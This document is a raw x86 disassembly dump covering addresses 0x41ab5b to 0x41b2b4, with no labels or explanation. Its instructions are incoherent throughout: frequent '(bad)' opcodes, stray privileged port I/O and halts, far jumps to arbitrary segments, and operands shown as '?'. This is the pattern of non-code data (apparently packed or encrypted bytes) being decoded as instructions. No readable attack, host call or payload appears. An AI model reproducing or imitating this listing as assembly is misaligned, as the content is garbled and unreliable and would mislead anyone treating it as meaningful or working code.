  41ab5b:	scas   eax,DWORD PTR es:[edi]
  41ab5c:	stc    
  41ab5d:	push   ebx
  41ab5e:	inc    esi
  41ab5f:	xchg   ebx,eax
  41ab60:	js     0x41abd0
  41ab62:	mov    eax,0x16f4fefa
  41ab67:	imul   esp,edi,0xfd6b73aa
  41ab6d:	hlt    
  41ab6e:	cmp    ah,BYTE PTR [eax+0x248e1ab8]
  41ab74:	sbb    bh,bl
  41ab76:	fs jo  0x41ab5b
  41ab79:	cmp    bh,BYTE PTR [di-0x59]
  41ab7d:	cdq    
  41ab7e:	xor    BYTE PTR [ecx+0x24],al
  41ab81:	cmp    dl,BYTE PTR [edi+0x13]
  41ab84:	jp     0x41abec
  41ab86:	mov    edi,0x693e9244
  41ab8b:	repz xchg ecx,eax
  41ab8d:	add    eax,0xc095c837
  41ab92:	pop    esp
  41ab93:	popf   
  41ab94:	jo     0x41abfc
  41ab96:	cmc    
  41ab97:	pop    eax
  41ab98:	sub    BYTE PTR [edx-0x7c5cfe33],dl
  41ab9e:	inc    ecx
  41ab9f:	stos   BYTE PTR es:[edi],al
  41aba0:	addr16 jmp 0x41ab85
  41aba3:	aam    0x86
  41aba5:	nop
  41aba6:	adc    eax,0x3a315cc8
  41abab:	fsubrp st(3),st
  41abad:	xor    cl,BYTE PTR [edi]
  41abaf:	not    DWORD PTR [esi]
  41abb1:	xor    eax,0x58ab82f6
  41abb6:	and    eax,0xa1f440d3
  41abbb:	or     bx,di
  41abbe:	fld    TBYTE PTR [ecx-0x390d1fb1]
  41abc4:	cwde   
  41abc5:	pop    ss
  41abc6:	imul   edi,esi,0xaf4bbcf5
  41abcc:	aas    
  41abcd:	repz jbe 0x41ab54
  41abd0:	rol    BYTE PTR [ebx],0x48
  41abd3:	shl    dl,0xda
  41abd6:	push   ecx
  41abd7:	shl    DWORD PTR [ebx],1
  41abd9:	adc    eax,0x5398d182
  41abde:	rcr    DWORD PTR [esi-0x35],0xfa
  41abe2:	add    dh,BYTE PTR [ebp-0x54]
  41abe5:	data16 (bad) 
  41abe7:	cmp    al,0x1a
  41abe9:	xor    al,0xe3
  41abeb:	(bad)  
  41abed:	add    ebx,DWORD PTR ds:0xf895752f
  41abf3:	jo     0x41ac11
  41abf5:	cmp    eax,edx
  41abf7:	aaa    
  41abf8:	nop
  41abf9:	jb     0x41ab88
  41abfb:	pop    ebx
  41abfc:	cmp    BYTE PTR [ebp-0x5ec65464],ch
  41ac02:	js     0x41ac34
  41ac04:	xor    DWORD PTR [eax],ecx
  41ac06:	lahf   
  41ac07:	add    eax,0x390c5250
  41ac0c:	xor    ebp,edi
  41ac0e:	fs xchg ecx,eax
  41ac10:	add    BYTE PTR [ecx],bh
  41ac12:	dec    esi
  41ac13:	stos   DWORD PTR es:[edi],eax
  41ac14:	add    ebp,ebx
  41ac16:	(bad)  
  41ac17:	jmp    0x38fd28d9
  41ac1c:	jp     0x41abbf
  41ac1e:	arpl   WORD PTR [ecx+0x4d],si
  41ac21:	pop    ebp
  41ac22:	dec    ebx
  41ac23:	ficomp DWORD PTR [ebp+0x50afcb05]
  41ac29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac2a:	or     DWORD PTR [eax+0x4e],0x25
  41ac2e:	mov    ecx,cs
  41ac30:	or     al,0x4
  41ac32:	bound  ebp,QWORD PTR [esi+0x11]
  41ac35:	loope  0x41abd8
  41ac37:	addr16 add ebp,edx
  41ac3a:	xor    al,0xbd
  41ac3c:	jmp    DWORD PTR [edi-0x78]
  41ac3f:	daa    
  41ac40:	and    ecx,DWORD PTR [edi+0x1f]
  41ac43:	jne    0x41abc8
  41ac45:	sbb    al,0xe9
  41ac47:	inc    eax
  41ac48:	push   ebx
  41ac49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac4a:	outs   dx,DWORD PTR ds:[esi]
  41ac4b:	xchg   BYTE PTR [esi+0x67],dl
  41ac4e:	adc    edi,eax
  41ac50:	cmp    DWORD PTR [ecx-0x7f8ce035],ebx
  41ac56:	(bad)  
  41ac58:	out    dx,al
  41ac59:	pop    es
  41ac5a:	ins    BYTE PTR es:[edi],dx
  41ac5b:	push   0x45
  41ac5d:	add    bl,BYTE PTR [edi+0x4e]
  41ac60:	rol    esp,cl
  41ac62:	jb     0x41ac48
  41ac64:	sub    eax,0xd1d6bf0a
  41ac69:	add    eax,0x8e36f129
  41ac6e:	int3   
  41ac6f:	int    0xe5
  41ac71:	(bad)  
  41ac72:	aaa    
  41ac73:	push   cs
  41ac74:	fcom   QWORD PTR [eax-0x64ccb805]
  41ac7a:	es lahf 
  41ac7c:	add    BYTE PTR [ecx],cl
  41ac7e:	hlt    
  41ac7f:	loop   0x41acd3
  41ac81:	out    0x3b,al
  41ac83:	fnstsw WORD PTR [edx+0x47]
  41ac86:	push   ebx
  41ac87:	and    eax,0x5ba5ce67
  41ac8c:	hlt    
  41ac8d:	sbb    dl,ch
  41ac8f:	sub    DWORD PTR gs:[ebx-0x6b],edx
  41ac93:	add    esp,DWORD PTR [esi+0x59d1ccf7]
  41ac99:	sub    eax,0xea5ba11f
  41ac9e:	push   esi
  41ac9f:	push   esp
  41aca0:	int    0x58
  41aca2:	popf   
  41aca3:	sti    
  41aca4:	mov    ecx,0x5af67a1c
  41aca9:	sub    ebp,DWORD PTR [ebx-0x7bcfaf13]
  41acaf:	cmc    
  41acb0:	scas   eax,DWORD PTR es:[edi]
  41acb1:	rol    BYTE PTR [edx-0x22e134be],1
  41acb7:	shr    BYTE PTR [esi],0xfd
  41acba:	mov    esi,0xc2b4b43e
  41acbf:	lea    esp,[edi-0xc]
  41acc2:	in     eax,0xc
  41acc4:	xchg   esp,eax
  41acc5:	data16 ror BYTE PTR [ebx],1
  41acc8:	mov    bh,0xda
  41acca:	sbb    eax,0x703bee80
  41accf:	cld    
  41acd0:	add    eax,0xe9d2a2f9
  41acd5:	fwait
  41acd6:	js     0x41ad18
  41acd8:	pop    esp
  41acd9:	mov    al,ds:0xa0fc342e
  41acde:	inc    edx
  41acdf:	push   0x88981c75
  41ace4:	clc    
  41ace5:	sub    bl,BYTE PTR [ebx-0x73]
  41ace8:	sahf   
  41ace9:	rcl    BYTE PTR [ecx+0x1c],1
  41acec:	pop    edx
  41aced:	clc    
  41acee:	mov    ss,WORD PTR [edi]
  41acf0:	or     BYTE PTR [ecx],bh
  41acf2:	jmp    0x41acc9
  41acf4:	aad    0x76
  41acf6:	in     al,0x42
  41acf8:	sub    eax,0xd578186c
  41acfd:	mov    ah,0x24
  41acff:	pop    edi
  41ad00:	mov    bx,0x9ebe
  41ad04:	mov    ah,0x51
  41ad06:	xchg   edx,eax
  41ad07:	cmp    eax,0x3c860e86
  41ad0c:	cmc    
  41ad0d:	and    al,0x17
  41ad0f:	ja     0x41ace2
  41ad11:	adc    eax,0x81b9e597
  41ad16:	dec    esp
  41ad17:	gs push 0x28
  41ad1a:	mov    al,ds:0xf02b7ea2
  41ad1f:	add    BYTE PTR [ecx-0x4d],bh
  41ad22:	or     BYTE PTR [edi+0x99467ce],dl
  41ad28:	pop    ds
  41ad29:	scas   al,BYTE PTR es:[edi]
  41ad2a:	in     al,dx
  41ad2b:	mov    ebp,0x4cfaab38
  41ad30:	fsub   DWORD PTR [edi+0x22c377a0]
  41ad36:	clc    
  41ad37:	not    BYTE PTR ds:0x52fb006a
  41ad3d:	repnz mov ch,0xbe
  41ad40:	int    0xce
  41ad42:	xchg   ebp,eax
  41ad43:	sub    BYTE PTR [eax],bl
  41ad45:	inc    BYTE PTR [edi]
  41ad47:	sbb    eax,0xda72583e
  41ad4c:	push   ebp
  41ad4d:	aam    0x8d
  41ad4f:	pushf  
  41ad50:	scas   eax,DWORD PTR es:[edi]
  41ad51:	lahf   
  41ad52:	lds    ecx,FWORD PTR [esp+edi*1]
  41ad55:	repnz aas 
  41ad57:	stos   BYTE PTR es:[edi],al
  41ad58:	stos   BYTE PTR es:[edi],al
  41ad59:	cmp    ah,BYTE PTR [ebp+0x35]
  41ad5c:	fwait
  41ad5d:	push   esi
  41ad5e:	push   esp
  41ad5f:	mov    al,ds:0xbd0890ca
  41ad65:	mov    eax,ds:0xe727710f
  41ad6a:	arpl   bp,bx
  41ad6c:	in     al,dx
  41ad6d:	ret    
  41ad6e:	pushf  
  41ad6f:	and    BYTE PTR [ecx+edx*4+0x6cd2af81],bh
  41ad76:	test   eax,0xdde08b31
  41ad7b:	jecxz  0x41ad64
  41ad7d:	dec    ebx
  41ad7e:	rcl    BYTE PTR [ecx+0x76e46c33],cl
  41ad84:	push   es
  41ad85:	xchg   BYTE PTR [edi+0x43],al
  41ad88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad89:	xchg   edx,eax
  41ad8a:	jae    0x41ad2d
  41ad8c:	iret   
  41ad8d:	mov    dl,0x2e
  41ad8f:	jne    0x41ad60
  41ad91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad92:	or     cl,BYTE PTR [eax]
  41ad94:	pop    esi
  41ad95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad96:	sar    DWORD PTR [edi+eiz*1-0x14],0x41
  41ad9b:	inc    edx
  41ad9c:	mov    esp,0x3c7825d5
  41ada1:	sub    al,0xf8
  41ada3:	or     ah,al
  41ada5:	inc    edx
  41ada6:	jmp    0xa76e:0xdf4bb3f6
  41adad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adae:	std    
  41adaf:	pushf  
  41adb0:	mov    esp,DWORD PTR [ebp+0x1cb8bfee]
  41adb6:	mov    bl,0x7f
  41adb8:	popa   
  41adb9:	popa   
  41adba:	adc    ch,BYTE PTR [ebp-0x23]
  41adbd:	xchg   ebp,eax
  41adbe:	sub    ah,BYTE PTR [edx-0x3e]
  41adc1:	repnz mov ebp,DWORD PTR [edi-0xbe0cac5]
  41adc8:	mov    al,dh
  41adca:	and    eax,0xcc74917d
  41adcf:	mov    ds:0xcd917ec1,al
  41add4:	sub    eax,0x4d1da70b
  41add9:	dec    ecx
  41adda:	mov    ds:0xddeb4083,eax
  41addf:	cli    
  41ade0:	mov    cl,0xde
  41ade2:	outs   dx,BYTE PTR ds:[esi]
  41ade3:	xchg   edx,eax
  41ade4:	icebp  
  41ade5:	aad    0xe4
  41ade7:	inc    edx
  41ade8:	push   0x71
  41adea:	pop    eax
  41adeb:	mov    DWORD PTR [edi],0x353d99cf
  41adf1:	enter  0x672f,0xd0
  41adf5:	bound  eax,QWORD PTR [ecx]
  41adf7:	dec    ebp
  41adf8:	sub    al,0x7f
  41adfa:	pop    esi
  41adfb:	or     esi,DWORD PTR [edx-0x47]
  41adfe:	pop    ss
  41adff:	jbe    0x41adf4
  41ae01:	jb     0x41adc4
  41ae03:	idiv   DWORD PTR [ebx-0xd]
  41ae06:	or     esp,DWORD PTR [edi+ebp*4]
  41ae09:	jnp    0x41ae68
  41ae0b:	arpl   WORD PTR [edi],bp
  41ae0d:	jecxz  0x41ae4c
  41ae0f:	adc    al,0xf3
  41ae11:	push   es
  41ae12:	ds xor bl,dh
  41ae15:	mov    edx,0x42931afa
  41ae1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae1b:	sub    al,0x29
  41ae1d:	jne    0x41ae94
  41ae1f:	std    
  41ae20:	sahf   
  41ae21:	push   ds
  41ae22:	jmp    0x41adad
  41ae24:	loope  0x41adad
  41ae26:	sar    edi,cl
  41ae28:	cwde   
  41ae29:	sbb    edx,DWORD PTR ds:0x5cd39ec9
  41ae2f:	fcomp  QWORD PTR [edi-0x6d]
  41ae32:	mov    BYTE PTR [eax+0x2d],bh
  41ae35:	inc    eax
  41ae36:	dec    esi
  41ae37:	dec    ecx
  41ae38:	fldcw  WORD PTR [edx]
  41ae3b:	out    dx,al
  41ae3c:	idiv   BYTE PTR [edi]
  41ae3e:	jmp    0x3582:0x685b4dc6
  41ae45:	sbb    ebp,DWORD PTR [edx]
  41ae47:	inc    esi
  41ae48:	popa   
  41ae49:	(bad)  
  41ae4a:	jle    0x41ae8c
  41ae4c:	dec    esi
  41ae4d:	sub    al,0x5e
  41ae4f:	xchg   esp,eax
  41ae50:	pop    ebp
  41ae51:	stc    
  41ae52:	dec    esi
  41ae53:	jle    0x41ae6f
  41ae55:	pusha  
  41ae56:	xor    DWORD PTR [ebx],ecx
  41ae58:	jmp    0xbfa82d0
  41ae5d:	sub    eax,0x7fc38010
  41ae62:	lds    ecx,FWORD PTR [ecx+0x3d5d5061]
  41ae68:	and    esp,DWORD PTR [edx+0x2daea821]
  41ae6e:	dec    edx
  41ae6f:	pop    ds
  41ae70:	push   es
  41ae71:	ss nop
  41ae73:	sahf   
  41ae74:	xor    ah,BYTE PTR [ecx+0x15fbee5d]
  41ae7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae7b:	cwde   
  41ae7c:	mov    al,0x6c
  41ae7e:	sti    
  41ae7f:	inc    ebp
  41ae80:	pop    eax
  41ae81:	ins    BYTE PTR es:[edi],dx
  41ae82:	jb     0x41ae41
  41ae84:	push   eax
  41ae85:	or     eax,DWORD PTR [ebx]
  41ae87:	ss test dh,0x2c
  41ae8b:	inc    edi
  41ae8c:	mov    BYTE PTR [ecx+0x2a],al
  41ae8f:	sub    ecx,DWORD PTR [ecx+0x4c76ea69]
  41ae95:	pushf  
  41ae96:	or     DWORD PTR [edi],0x3d
  41ae99:	mov    WORD PTR [esi],cs
  41ae9b:	sti    
  41ae9c:	loopne 0x41ae75
  41ae9e:	fimul  DWORD PTR [ecx]
  41aea0:	xchg   edx,eax
  41aea1:	inc    esi
  41aea2:	cld    
  41aea3:	inc    ecx
  41aea4:	mov    WORD PTR [edi],?
  41aea6:	jnp    0x41ae7e
  41aea8:	push   eax
  41aea9:	lahf   
  41aeaa:	fldcw  WORD PTR [ebx]
  41aeac:	(bad)  
  41aead:	xchg   ebx,eax
  41aeae:	or     ah,cl
  41aeb0:	in     al,dx
  41aeb1:	cdq    
  41aeb2:	push   esi
  41aeb3:	jns    0x41ae89
  41aeb5:	sub    eax,0x3d07ee27
  41aeba:	loop   0x41ae8e
  41aebc:	out    0xf8,al
  41aebe:	mov    ecx,0x866e70a7
  41aec3:	pop    eax
  41aec4:	ret    
  41aec5:	out    dx,eax
  41aec6:	fldcw  WORD PTR [edi+0x43]
  41aec9:	shl    BYTE PTR ds:0x5a88f937,0x80
  41aed0:	inc    ebp
  41aed1:	add    BYTE PTR [eax],al
  41aed3:	and    eax,0x1a33a151
  41aed8:	push   ds
  41aed9:	jle    0x41aebb
  41aedb:	jb     0x41ae69
  41aedd:	dec    ebx
  41aede:	xor    al,0xaf
  41aee0:	dec    edi
  41aee1:	adc    DWORD PTR [ebp+0x724f735],esp
  41aee7:	pop    ebp
  41aee8:	(bad)  
  41aeea:	nop
  41aeeb:	mov    ecx,0x45f49180
  41aef0:	lea    ecx,[ebp-0x71]
  41aef3:	fdivr  DWORD PTR [edi+0x42]
  41aef6:	loope  0x41aed3
  41aef8:	sub    DWORD PTR [esp+esi*4-0x7d],ecx
  41aefc:	inc    esp
  41aefd:	or     al,0x74
  41aeff:	dec    edi
  41af00:	dec    ecx
  41af01:	daa    
  41af02:	ss xchg ebx,eax
  41af04:	pop    esp
  41af05:	push   0x17
  41af07:	shr    BYTE PTR [esi+0x2c97396a],0x8b
  41af0e:	(bad)  
  41af0f:	stc    
  41af10:	(bad)  
  41af11:	mov    ch,0xa4
  41af13:	xchg   edi,eax
  41af14:	mov    DWORD PTR [edx],esp
  41af16:	dec    esp
  41af17:	jge    0x41af4b
  41af19:	adc    edx,DWORD PTR [ebx-0x7e]
  41af1c:	into   
  41af1d:	sub    DWORD PTR [edi+ecx*4+0x2e94dc82],edi
  41af24:	pop    eax
  41af25:	mov    al,ds:0x4b4dfc51
  41af2a:	adc    cl,BYTE PTR [edi-0x32]
  41af2d:	shl    DWORD PTR [eax-0xf],0x41
  41af31:	imul   ebx,DWORD PTR [edi-0x1859d78d],0xffffffc3
  41af38:	in     al,0x92
  41af3a:	out    dx,al
  41af3b:	fxch   st(1)
  41af3d:	jmp    0x994d:0xe81ad272
  41af44:	xor    BYTE PTR [ebp-0x4e],dh
  41af47:	jne    0x41af72
  41af49:	add    DWORD PTR ss:[ecx-0x28],0x7443d2eb
  41af51:	cs xor esp,0xe5f944c2
  41af58:	or     ecx,esi
  41af5a:	inc    esp
  41af5b:	adc    eax,0x6e9e1bd6
  41af60:	out    0xf9,al
  41af62:	sbb    ebx,DWORD PTR [edx]
  41af64:	add    DWORD PTR ds:0xabab8885,esi
  41af6a:	add    esi,DWORD PTR [ebx+0x6b]
  41af6d:	xchg   esi,eax
  41af6e:	das    
  41af6f:	stos   DWORD PTR es:[edi],eax
  41af70:	sub    dh,BYTE PTR [ebp+eiz*2-0x37]
  41af74:	jg     0x41af5e
  41af76:	in     eax,dx
  41af77:	iret   
  41af78:	cwde   
  41af79:	add    BYTE PTR [ecx+0x363482a3],al
  41af7f:	lahf   
  41af80:	and    eax,esi
  41af82:	in     eax,dx
  41af83:	lods   al,BYTE PTR ds:[esi]
  41af84:	test   eax,0xc7e54448
  41af89:	dec    edi
  41af8a:	dec    ebp
  41af8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af8d:	ret    0xd081
  41af90:	ret    0x6764
  41af93:	fimul  DWORD PTR [edi]
  41af95:	and    BYTE PTR [edx+0x1c],cl
  41af98:	or     DWORD PTR ds:0x996bcc4d,ebx
  41af9e:	ins    DWORD PTR es:[edi],dx
  41af9f:	jno    0x41afe8
  41afa1:	mov    ebx,0x5373957f
  41afa6:	ficomp WORD PTR [edx-0x2a732c92]
  41afac:	adc    al,0x19
  41afae:	adc    BYTE PTR [edi+0x21f6614c],ch
  41afb4:	aas    
  41afb5:	mov    ah,ch
  41afb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afb8:	stc    
  41afb9:	in     eax,dx
  41afba:	(bad)  
  41afbb:	jl     0x41af81
  41afbd:	fcomp  QWORD PTR [ecx]
  41afbf:	shl    dh,0x53
  41afc2:	lds    ebx,FWORD PTR [edi-0x4e]
  41afc5:	stc    
  41afc6:	add    al,0xf4
  41afc8:	add    dh,BYTE PTR [edx-0x383b25a9]
  41afce:	or     cl,BYTE PTR [ecx+0x1dcc226c]
  41afd4:	dec    edi
  41afd5:	sbb    BYTE PTR [ebx-0x1a],0x90
  41afd9:	test   eax,0xc6e8ca6e
  41afde:	and    al,0xab
  41afe0:	push   es
  41afe1:	into   
  41afe2:	inc    edi
  41afe3:	test   eax,0x20555456
  41afe8:	jae    0x41b010
  41afea:	fild   DWORD PTR [ebp+0x4ea1ee3f]
  41aff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aff1:	inc    edx
  41aff2:	mov    al,ah
  41aff4:	dec    esp
  41aff5:	ds es mov esp,ecx
  41aff9:	repz sbb ebp,DWORD PTR [eax]
  41affc:	inc    esi
  41affd:	test   BYTE PTR [edi],0xaf
  41b000:	push   es
  41b001:	add    al,0x4e
  41b003:	inc    edi
  41b004:	call   0x461da29e
  41b009:	bound  ebp,QWORD PTR [ebx+0x1c]
  41b00c:	pop    esp
  41b00d:	pop    esi
  41b00e:	lds    edx,FWORD PTR [ebx-0x2eaa9ee4]
  41b014:	aad    0xb
  41b016:	mov    ?,WORD PTR [ecx+0x623d6606]
  41b01c:	out    dx,al
  41b01d:	pushf  
  41b01e:	out    dx,al
  41b01f:	nop
  41b020:	dec    esp
  41b021:	addr16 cwde 
  41b023:	lds    esp,FWORD PTR ds:0x639d7b3a
  41b029:	popf   
  41b02a:	mov    ds:0x910421e7,eax
  41b02f:	ja     0x41b06c
  41b031:	pop    ss
  41b032:	out    0xce,al
  41b034:	push   eax
  41b035:	data16 (bad) 
  41b037:	rcr    DWORD PTR [ebx],1
  41b039:	pop    edx
  41b03a:	xchg   edx,eax
  41b03b:	inc    eax
  41b03c:	mov    dl,0x4e
  41b03e:	popa   
  41b03f:	outs   dx,DWORD PTR ds:[esi]
  41b040:	xchg   DWORD PTR [esi-0x1a],ecx
  41b043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b044:	fldcw  WORD PTR [ebx+0x62a2aaca]
  41b04a:	mov    cl,BYTE PTR [esi+0x5b]
  41b04d:	adc    BYTE PTR [ebx-0x2fa6c532],bh
  41b053:	ins    DWORD PTR es:[edi],dx
  41b054:	adc    BYTE PTR [ecx+0x2c],0x67
  41b058:	mov    edi,0x3f34607e
  41b05d:	pop    ebp
  41b05e:	jne    0x41b0c2
  41b060:	xchg   ebx,eax
  41b061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b062:	pushf  
  41b063:	cmp    ebx,DWORD PTR [edx-0x14]
  41b066:	test   al,0x32
  41b068:	aad    0xc7
  41b06a:	jo     0x41b024
  41b06c:	sahf   
  41b06d:	loope  0x41b07f
  41b06f:	push   esi
  41b070:	mov    bh,0xaa
  41b072:	retf   
  41b073:	dec    eax
  41b074:	lods   eax,DWORD PTR ss:[esi]
  41b076:	jbe    0x41b0c2
  41b078:	and    ebp,DWORD PTR [eax]
  41b07a:	repnz push 0xffffffed
  41b07d:	inc    eax
  41b07e:	xor    DWORD PTR [edx+eax*1],edi
  41b081:	or     DWORD PTR [eax+0x12],ebp
  41b084:	aas    
  41b085:	adc    al,0x1c
  41b087:	adc    eax,0xfcf21ec9
  41b08c:	(bad)  
  41b08d:	loop   0x41b0bd
  41b08f:	push   es
  41b090:	mov    bh,0xfb
  41b092:	les    eax,FWORD PTR [edi-0x41]
  41b095:	stos   BYTE PTR es:[edi],al
  41b096:	push   es
  41b097:	adc    ch,BYTE PTR [esi+0x37cc7541]
  41b09d:	retf   0xa375
  41b0a0:	iret   
  41b0a1:	push   ds
  41b0a2:	sbb    ah,BYTE PTR [eax]
  41b0a4:	xor    al,BYTE PTR ds:0x4b001dbf
  41b0aa:	push   0x5e
  41b0ac:	push   edi
  41b0ad:	sbb    ah,BYTE PTR [edx]
  41b0af:	aad    0xbb
  41b0b1:	inc    edi
  41b0b2:	mov    bh,0xed
  41b0b4:	popf   
  41b0b5:	ss dec esp
  41b0b7:	into   
  41b0b8:	sbb    dh,BYTE PTR [esi+0x5a271a94]
  41b0be:	mov    al,dh
  41b0c0:	xlat   BYTE PTR ds:[ebx]
  41b0c1:	mov    BYTE PTR [ebx],bh
  41b0c3:	ds inc ecx
  41b0c5:	cmp    eax,0x96743a1e
  41b0ca:	cmp    eax,DWORD PTR [edx]
  41b0cc:	inc    ecx
  41b0cd:	scas   eax,DWORD PTR es:[edi]
  41b0ce:	add    al,0xcb
  41b0d0:	or     al,0x7d
  41b0d2:	mov    ecx,0xfbde1044
  41b0d7:	(bad)
  41b0db:	mov    edx,0x48857f5c
  41b0e0:	or     cl,BYTE PTR [ebx]
  41b0e2:	repnz cmp DWORD PTR [ebp-0x5acd8845],eax
  41b0e9:	and    esp,DWORD PTR [edi+esi*1+0x68]
  41b0ed:	stc    
  41b0ee:	lods   eax,DWORD PTR ds:[esi]
  41b0ef:	scas   al,BYTE PTR es:[edi]
  41b0f0:	sub    eax,0xcfdb1fb1
  41b0f5:	mov    WORD PTR [eax],es
  41b0f7:	cmc    
  41b0f8:	and    DWORD PTR fs:[ebp+ebp*1-0x9d39283],ecx
  41b100:	jg     0x41b082
  41b102:	push   ecx
  41b103:	sahf   
  41b104:	imul   edi,DWORD PTR [edi+0xbfbd196],0xffffffd5
  41b10b:	pop    esi
  41b10c:	jmp    0x41b184
  41b10e:	xchg   ebp,eax
  41b10f:	bnd jmp 0x2a011b2a
  41b115:	and    al,0x7f
  41b117:	loope  0x41b09f
  41b119:	mov    ds:0xb521d39e,al
  41b11e:	(bad)  
  41b11f:	push   cs
  41b120:	or     bh,BYTE PTR [edi]
  41b122:	mov    esp,0x56bdf6a4
  41b127:	mov    edx,DWORD PTR [edi]
  41b129:	mov    ebx,0x2da5bf6e
  41b12e:	cdq    
  41b12f:	xor    eax,0xad83de70
  41b134:	xor    eax,0xb72a294f
  41b139:	(bad)  
  41b13a:	out    dx,al
  41b13b:	int3   
  41b13c:	sub    eax,0xff285d92
  41b141:	push   es
  41b142:	mov    DWORD PTR [esp+ebx*1+0x7d],ebx
  41b146:	loop   0x41b0f3
  41b148:	and    BYTE PTR [ebx-0x2476ed28],dl
  41b14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b14f:	sbb    ecx,eax
  41b151:	sub    esp,DWORD PTR [eax]
  41b153:	inc    ebp
  41b154:	and    esp,edi
  41b156:	shr    esi,cl
  41b158:	ret    0x4342
  41b15b:	test   cl,bl
  41b15d:	dec    ecx
  41b15e:	jl     0x41b1d5
  41b160:	(bad)  
  41b162:	sub    DWORD PTR [esp+eax*8+0x41],ebp
  41b166:	mov    eax,ds:0xae7015e7
  41b16b:	call   0x473d7d11
  41b170:	push   ebp
  41b171:	jnp    0x41b114
  41b173:	or     al,0x65
  41b175:	and    eax,0x6930153c
  41b17a:	popf   
  41b17b:	in     eax,dx
  41b17c:	fidivr DWORD PTR [ecx+0x59]
  41b17f:	sbb    dl,BYTE PTR [eax+0x67]
  41b182:	mov    al,ds:0x21775baf
  41b187:	adc    al,BYTE PTR [ebp-0xd]
  41b18a:	test   BYTE PTR [eax],ah
  41b18c:	mov    ebp,0x1096abc9
  41b191:	pop    ecx
  41b192:	std    
  41b193:	pop    es
  41b194:	pop    ebp
  41b195:	aam    0x1d
  41b197:	jp     0x41b160
  41b199:	mov    eax,0x2dbcedf5
  41b19e:	xor    eax,0xe6129718
  41b1a3:	ret    
  41b1a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a5:	scas   al,BYTE PTR es:[edi]
  41b1a6:	je     0x41b17f
  41b1a8:	int    0x21
  41b1aa:	pusha  
  41b1ab:	sbb    BYTE PTR ds:0xd749c9f5,bl
  41b1b1:	and    ecx,DWORD PTR [ebx]
  41b1b3:	sub    ebp,DWORD PTR [ebx*2-0x5128160b]
  41b1ba:	push   cs
  41b1bb:	sub    bl,BYTE PTR [eax]
  41b1bd:	stos   BYTE PTR es:[edi],al
  41b1be:	jns    0x41b159
  41b1c0:	push   DWORD PTR [edx-0x1c]
  41b1c3:	push   0x94008bcf
  41b1c8:	shr    BYTE PTR [ebx+0x759e2e08],1
  41b1ce:	xchg   DWORD PTR [esi],ecx
  41b1d0:	or     al,0xb1
  41b1d2:	push   esp
  41b1d3:	jbe    0x41b1e5
  41b1d5:	mov    WORD PTR [ecx+ebx*4-0x4f783dba],es
  41b1dc:	pop    ss
  41b1dd:	jb     0x41b246
  41b1df:	dec    ebp
  41b1e0:	add    DWORD PTR [ecx],0xdd46b2c8
  41b1e6:	(bad)  
  41b1e7:	push   edx
  41b1e8:	or     eax,0xda655137
  41b1ed:	adc    ecx,DWORD PTR [edi-0x24]
  41b1f0:	fmulp  st(5),st
  41b1f2:	aam    0xb1
  41b1f4:	xchg   DWORD PTR [ecx-0x7c9b3928],edi
  41b1fa:	pop    ss
  41b1fb:	mov    edi,0xcc04999
  41b200:	sbb    ah,BYTE PTR [edx]
  41b202:	pop    eax
  41b203:	call   0xf53b:0xbf7643bb
  41b20a:	pop    esp
  41b20b:	push   ss
  41b20c:	push   cs
  41b20d:	mov    eax,0x54ac9e18
  41b212:	or     dh,BYTE PTR [ecx+eiz*8]
  41b215:	ins    BYTE PTR es:[edi],dx
  41b216:	xchg   ecx,eax
  41b217:	stos   DWORD PTR es:[edi],eax
  41b218:	repz jo 0x41b1a9
  41b21b:	inc    edi
  41b21c:	fnstsw WORD PTR es:[eax]
  41b21f:	dec    esp
  41b220:	aad    0x20
  41b222:	sti    
  41b223:	cld    
  41b224:	add    eax,0x97bd21ed
  41b229:	mov    cl,0xb2
  41b22b:	add    DWORD PTR [esi+0x4a],0xffffff9b
  41b22f:	mov    ds:0x3e95d2e4,eax
  41b234:	xchg   esp,eax
  41b235:	fs sbb eax,0x268c6b32
  41b23b:	test   eax,0x1660e616
  41b240:	lods   al,BYTE PTR ds:[esi]
  41b241:	dec    ebx
  41b242:	dec    edi
  41b243:	fstp   QWORD PTR [edi+0x144bbd29]
  41b249:	into   
  41b24a:	call   0x3935:0x2c520d50
  41b251:	popa   
  41b252:	lds    esi,FWORD PTR [edi]
  41b254:	mov    ds:0x3c541c4f,al
  41b259:	mov    BYTE PTR ds:0x843391fa,ah
  41b25f:	sahf   
  41b260:	and    al,0x87
  41b262:	jae    0x41b27a
  41b264:	add    bh,bl
  41b266:	fcomp  st(6)
  41b268:	imul   eax,DWORD PTR [eax-0x10cda0a6],0x82aa3779
  41b272:	outs   dx,BYTE PTR ds:[esi]
  41b273:	out    dx,eax
  41b274:	ss push ss
  41b276:	dec    edi
  41b277:	(bad)  
  41b278:	adc    al,0x41
  41b27a:	and    ebp,DWORD PTR [esi-0x632e9e0]
  41b280:	push   ds
  41b281:	mov    bh,bl
  41b283:	(bad)  
  41b284:	mov    ebp,0x8e58c494
  41b289:	lea    esi,[edi-0x16]
  41b28c:	or     ebp,edi
  41b28e:	js     0x41b259
  41b290:	test   DWORD PTR [ebx-0x5059af76],esp
  41b296:	pop    es
  41b297:	add    BYTE PTR [edx-0x1f4e9679],dl
  41b29d:	jnp    0x41b29d
  41b29f:	popa   
  41b2a0:	addr16 mov ch,0x1d
  41b2a3:	loope  0x41b295
  41b2a5:	cwde   
  41b2a6:	dec    esp
  41b2a7:	(bad)  
  41b2a8:	into   
  41b2a9:	rol    BYTE PTR [edx+0x5bbf41c5],0x10
  41b2b0:	push   esi
  41b2b1:	rcr    DWORD PTR [edx-0x53],1
  41b2b4:	xor    edx,0xffffffdf
